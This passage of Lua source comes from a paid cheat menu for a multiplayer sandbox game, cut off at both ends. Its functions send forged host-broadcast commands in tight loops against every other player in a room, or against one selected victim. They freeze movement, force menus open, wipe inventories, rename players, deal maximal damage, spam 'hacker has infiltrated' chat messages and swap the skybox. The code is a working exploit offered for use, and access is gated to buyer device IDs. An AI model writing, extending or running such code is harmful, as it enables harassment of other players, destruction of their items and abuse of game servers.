                    tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "setAtt";
                tdata[3] = {targetUin, 1, 2}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "yanhua", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "12834", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "bossskill_lasertailblue", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "ice_bingshi_boss", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "mob_3514_white", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "nengliang_xiqu", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "nengliang_baozha", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {targetUin, "jiguang01", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

function ggmx()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), "mob_3501" }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function wqfm()
    if ClientCurGame:isInGame() then
        local nameList = { 5, 6, 7, 8, 10 }
        for _, enchantId in ipairs(nameList) do
            local tdata = {
                [1] = "actor",
                [2] = "addEnchant",
                [3] = { AccountManager:getUin(), 5, enchantId, 5 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không thể sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadXin vui lòng vào phòng trước")
    end
end

function pctn1()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false

                -- ========================================================
                -- KHÔI PHỤC SKY VỀ MẶC ĐỊNH KHI BẤM DỪNG
                -- ========================================================
                local resetSkyTemplate = {
                    [1] = "world",
                    [2] = "SetSkyBoxTemplate",
                    [3] = {1}
                }
                local resetSkyFilter = {
                    [1] = "world",
                    [2] = "SetSkyBoxFilter",
                    [3] = {0, 10, 1}
                }
                pcall(function()
                    if ScriptSupportTask and SSTASKID then
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyTemplate)
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyFilter)
                    end
                end)
                -- ========================================================

                ShowGameTipsWithoutFilter("#cFF0000Đã dừng lại & Khôi phục Sky ban đầu")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- Lấy UID của bản thân
                local myUin = nil
                if AccountManager and AccountManager.getUin then
                    pcall(function()
                        myUin = AccountManager:getUin()
                    end)
                end

                -- ========================================================
                -- CẤU HÌNH SKYBOX
                -- ========================================================
                local skyBoxIds = {30101, 30102, 30103, 30104, 30105, 30201, 30202, 30203, 30204}
                local skyIndex = 1

                -- ========================================================
                -- MỞ LUỒNG CHẠY CHÍNH
                -- ========================================================
                _G.dffz_thread = threadpool:work(function()
                    ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                    while _G.dffz_enabled do
                        xpcall(function()
                            -- 1. Xử lý logic SkyBox và người chơi khác
                            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)

                            -- Mỗi vòng lặp, đổi 1 SkyBox tiếp theo
                            local currentSkyId = skyBoxIds[skyIndex]
                            local tdata = { "world", "SetSkyBoxMaps", {1, currentSkyId, ""} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            
                            skyIndex = skyIndex + 1
                            if skyIndex > #skyBoxIds then
                                skyIndex = 1
                            end

                            for i = 1, size do
                                if not _G.dffz_enabled then break end

                                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                                if targetPlayer then
                                    local targetUin = targetPlayer:getUin()
                                    
                                    -- Kiểm tra: Không phải bản thân VÀ Không có trong danh sách trắng toàn cục
                                    if targetUin ~= myUin and not (whitelist and whitelist[targetUin]) then
                                        tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "world", "SetTimeVanishingSpeed", {500} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "changeViewMode", {targetUin, 9, true} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 

                                        tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "chat", "sendChat", {"#cFFAAFF- Uy quyền Đế vương càn quét #cFFFFAA khắp thế gian\n#cFFBBEE- Làm chủ Cửu #cEEFFAA Thiên và Thập Địa\n#cFFCCDD- Đế Đạo ngự trị #cDDFFAA tối cao qua muôn thuở\n#cFFDDCC- Tiếng rồng gầm chấn động #cCCFFAA cả vũ trụ\n#cFFEEBB- Quyền uy Hoàng gia nắm giữ #cBBFFAA sinh sát đại quyền\n#cFFAAFF- Ánh sáng thần thánh soi rọi #cAAFFAA mọi cõi giới\n#cFFBBEE- Hào quang thần thánh gột rửa mọi tà ác", 1, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "chat", "sendChat", {"#cFF3333Đế vương của trời cao !!\n#cFF3333Đế vương của trời cao !!", 1, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "chat", "sendChat", {"#cFF3333Đế vương của trời cao !!\n#cFF3333Đế vương của trời cao !!", 1, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "chat", "sendChat", {"#cFF3333Đế vương của trời cao !!\n#cFF3333RĐế vương của trời cao !!", 1, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = { "chat", "sendChat", {"#RĐế vương của trời cao !!\n#RĐế vương của trời cao !!", 1, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "notifyGameInfo2Self", {targetUin, "#cFFFFAA王#cEEFFAA权#cDDFFAA执#cCCFFAA掌#cBBFFAA生#cAAFFAA死"} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "backpack", "clearAllPack", {targetUin} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end
                            end
                        end, function(err)
                            print("Lỗi vòng lặp: " .. tostring(err))
                        end)

                        -- Thời gian chờ lặp lại
                        threadpool:wait(0.01) 
                    end

                    ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                    _G.dffz_thread = nil
                end)
            end
        end
    )
end

function pctn2()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng ngay bảng menu giao diện khi ấn vào nút chức năng
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "⚠️ Cảnh báo ⚠️\nTính năng này sẽ hạ gục (kết liễu) toàn bộ người chơi trong phòng ngay lập tức!\nKhông được lạm dụng trừ trường hợp bất khả kháng!\nBạn có chắc chắn muốn thực thi không?",
        "Không", -- Nút bên trái (btnType == 0) -> Dừng lại
        "Đồng ý", -- Nút bên phải (btnType == 1) -> Bắt đầu
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng lại")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                _G.dffz_enabled = true

                local myUin = nil
                pcall(function() myUin = AccountManager:getUin() end)

                -- Kiểm tra và khởi tạo danh sách UIN được miễn nhiễm (whitelist)
                    if whitelist == nil then
                        whitelist = {}
                    end
                
                -- Mở một luồng chạy ngầm
                _G.dffz_thread = threadpool:work(function()
                    -- Lấy số lượng người chơi để hiển thị thông báo
                    local initialSize = ClientCurGame:requireArrayOfPlayers(-1, -1)
                    ShowGameTipsWithoutFilter("#c00ffff【Flash Sale Cao Cấp】Đã triển khai | Mục tiêu: " .. tostring(initialSize) .. " Người")

                    -- Thêm diAttack phát lệnh
                    local diAttack = {
                        [1] = "gamerule",
                        [2] = "setScoreKillPlayer",
                        [3] = {1}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack)
                    end)

                    while _G.dffz_enabled do
                        xpcall(function()
                            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)

                            for i = 1, size do
                                if not _G.dffz_enabled then break end

                                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                                if targetPlayer then
                                    local targetUin = targetPlayer:getUin()
                                    
                                    -- ========================================================
                                    -- KIỂM TRA: Không phải bản thân VÀ Không có trong danh sách trắng
                                    -- ========================================================
                                    if targetUin ~= myUin and not whitelist[targetUin] then
                                        local tdata = {}

                                        -- Thêm lệnh tác động mục tiêu 64 theo yêu cầu
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = { targetUin, 64, true }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        local dAttack = {
                                        [1] = "gamerule",
                                        [2] = "setKillNotify",
                                        [3] = {true}
                                        }
                                        pcall(function()
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, dAttack)
                                        end)

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changPlayerMoveType"
                                        tdata[3] = {targetUin, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changeViewMode"
                                        tdata[3] = {targetUin, 9, true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)  

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 797}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 798}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "changeCustomModel"
                                        tdata[3] = {targetUin, [=[role_11]=]}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        -- Gửi tin nhắn chat cảnh báo
                                        for c = 1, 10 do
                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFF3333Hacker đã xâm nhập\n#cFF3333有黑客闯入了。\n#cFF3333Hacker đã xâm nhập\n#cFF3333有黑客闯入了。\n", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "notifyGameInfo2Self"
                                        tdata[3] = {targetUin, "#b#cFF3333Hacker đã xâm nhập thiết bị bạn"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "backpack"
                                        tdata[2] = "clearAllPack"
                                        tdata[3] = {targetUin}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {targetUin, 1, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        if myUin then
                                        	tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setActionAttrState"
                                            tdata[3] = {myUin, 64, false}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setActionAttrState"
                                            tdata[3] = {myUin, 128, false}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end

                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30008, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        if myUin then
                                            tdata = {}
                                            tdata[1] = "actor"
                                            tdata[2] = "playerHurt"
                                            tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setAtt"
                                        tdata[3] = {targetUin, 1, 2}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end -- Kết thúc điều kiện danh sách trắng
                                end
                            end
                        end, function(err)
                            -- Bắt lỗi ngầm tránh crash luồng
                        end)

                        threadpool:wait(0.01) 
                    end

                    ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                    _G.dffz_thread = nil
                end)
            end
        end
    )
end

function pctn3()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#R开启成功")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000已停止")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- ========================================================
                    -- KIỂM TRA DANH SÁCH TRẮNG TOÀN CỤC (GLOBAL WHITELIST)
                    -- ========================================================
                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    -- ========================================================
                    -- CẤU HÌNH CẦU VỒNG CHO BẢN THÂN VÀ ĐỐI THỦ
                    -- ========================================================
                    local ENABLE_MYSELF = true
                    local TARGET_CUSTOM_TEXT = "Văn bản định sẵn của bạn" -- Tên định sẵn cho đối thủ

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- Lấy Tên gốc của bản thân để khôi phục khi tắt
                    local myOriginalName = nil
                    if AccountManager then
                        pcall(function()
                            pcall(function()
                                if AccountManager.getNickName then
                                    myOriginalName = AccountManager:getNickName()
                                elseif AccountManager.getName then
                                    myOriginalName = AccountManager:getName()
                                end
                            end)
                        end)
                    end

                    -- Lấy Tên gốc của đối thủ để khôi phục sau khi dừng / hạ gục
                    local targetOriginalName = nil
                    pcall(function()
                        if GamePlayerManager and GamePlayerManager.GetPlayerByUin then
                            local targetPlayer = GamePlayerManager:GetPlayerByUin(selectedUin)
                            if targetPlayer then
                                if targetPlayer.getNickName then
                                    targetOriginalName = targetPlayer:getNickName()
                                elseif targetPlayer.getName then
                                    targetOriginalName = targetPlayer:getName()
                                end
                            end
                        end
                    end)

                    -- Hàm tách ký tự UTF-8
                    local function splitUtf8(text)
                        local characters = {}
                        for character in string.gmatch(text, "[%z\1-\127\194-\244][\128-\191]*") do
                            table.insert(characters, character)
                        end
                        return characters
                    end

                    -- Chuyển HSV sang RGB
                    local function hsvToRgb(hue, saturation, value)
                        local sector = math.floor(hue * 6)
                        local fraction = hue * 6 - sector

                        local p = value * (1 - saturation)
                        local q = value * (1 - fraction * saturation)
                        local t = value * (1 - (1 - fraction) * saturation)

                        sector = sector % 6

                        local red, green, blue
                        if sector == 0 then red, green, blue = value, t, p
                        elseif sector == 1 then red, green, blue = q, value, p
                        elseif sector == 2 then red, green, blue = p, value, t
                        elseif sector == 3 then red, green, blue = p, q, value
                        elseif sector == 4 then red, green, blue = t, p, value
                        else red, green, blue = value, p, q
                        end

                        return math.floor(red * 255 + 0.5),
                               math.floor(green * 255 + 0.5),
                               math.floor(blue * 255 + 0.5)
                    end

                    -- Chuyển RGB sang Hex dạng RRGGBB
                    local function rgbToHex(red, green, blue)
                        return string.format("%02x%02x%02x", red, green, blue)
                    end

                    -- Tạo tên có hiệu ứng cầu vồng
                    local function createSmoothRainbow(text, baseHue)
                        local characters = splitUtf8(text)
                        local result = {}
                        local letterIndex = 0

                        for _, character in ipairs(characters) do
                            if character == " " or character == "\n" then
                                table.insert(result, character)
                            else
                                local hue = (baseHue + letterIndex * 0.08) % 1
                                local red, green, blue = hsvToRgb(hue, 1, 1)

                                table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                letterIndex = letterIndex + 1
                            end
                        end

                        return table.concat(result)
                    end

                    -- Hàm gửi lệnh đổi tên lên máy chủ
                    local function sendSetNickname(uid, nickname)
                        if not uid then return end
                        local tdata = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {
                                uid,
                                nickname
                            }
                        }
                        pcall(function()
                            if ScriptSupportTask and SSTASKID then
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdata
                                )
                            end
                        end)
                    end

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        local baseHue = 0
                        local targetBaseHue = 0

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- Kiểm tra lại danh sách trắng toàn cục liên tục trong lúc chạy phòng hờ thay đổi
                                if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                                    _G.dffz_enabled = false
                                    return
                                end

                                -- 1. Đổi tên cầu vồng liên tục cho bản thân
                                if ENABLE_MYSELF and myUin and myOriginalName then
                                    local myRainbowName = createSmoothRainbow(myOriginalName, baseHue)
                                    sendSetNickname(myUin, myRainbowName)
                                    baseHue = (baseHue + 0.02) % 1
                                end

                                -- 2. Đổi tên đối thủ thành văn bản định sẵn có hiệu ứng cầu vồng liên tục
                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin then
                                    local targetRainbowText = createSmoothRainbow(TARGET_CUSTOM_TEXT, targetBaseHue)
                                    sendSetNickname(targetUin, targetRainbowText)
                                    targetBaseHue = (targetBaseHue + 0.02) % 1

                                    -- Các tác động khác giữ nguyên
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.01) 
                        end

                        -- ========================================================
                        -- KHI DỪNG SCRIPT: KHÔI PHỤC TRẠNG THÁI CHO MỤC TIÊU & BẢN THÂN
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
                            -- Khôi phục di chuyển cho đối thủ
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)

                            -- Khôi phục tên gốc cho đối thủ
                            if targetOriginalName then
                                sendSetNickname(selectedUin, targetOriginalName)
                            end
                        end

                        -- Khôi phục tên gốc cho bản thân
                        if myUin and myOriginalName then
                            sendSetNickname(myUin, myOriginalName)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn4()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#R开启成功")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000已停止")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- ========================================================
                    -- KIỂM TRA DANH SÁCH TRẮNG TOÀN CỤC (GLOBAL WHITELIST)
                    -- ========================================================
                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- Kiểm tra lại danh sách trắng toàn cục liên tục trong lúc chạy
                                if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                                    _G.dffz_enabled = false
                                    return
                                end

                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin then
                                    -- Các tác động lặp liên tục
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.00001) 
                        end

                        -- ========================================================
                        -- KHI DỪNG SCRIPT: KHÔI PHỤC TRẠNG THÁI CHO MỤC TIÊU
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
